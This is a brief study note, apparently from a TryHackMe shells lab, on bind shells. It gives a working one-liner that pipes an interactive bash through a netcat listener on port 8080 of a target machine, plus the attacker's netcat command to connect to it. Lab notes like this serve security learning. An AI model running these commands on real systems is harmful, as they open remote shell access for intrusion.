# THM_Shells
Basic Shells


### **Bind Shells BLUF**
Let's create a bind shell. In this case, the attacker can use a command like the one below on the $${\color{red}target\  machine}$$.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Once the command is executed, it will wait for an incoming connection.

#### **Attacker Connects to the Bind Shell**

🚨🚨🚨  Use Netcat on Attack computer with the following command to connect:
```bash
nc -nv TARGET_IP 8080
```
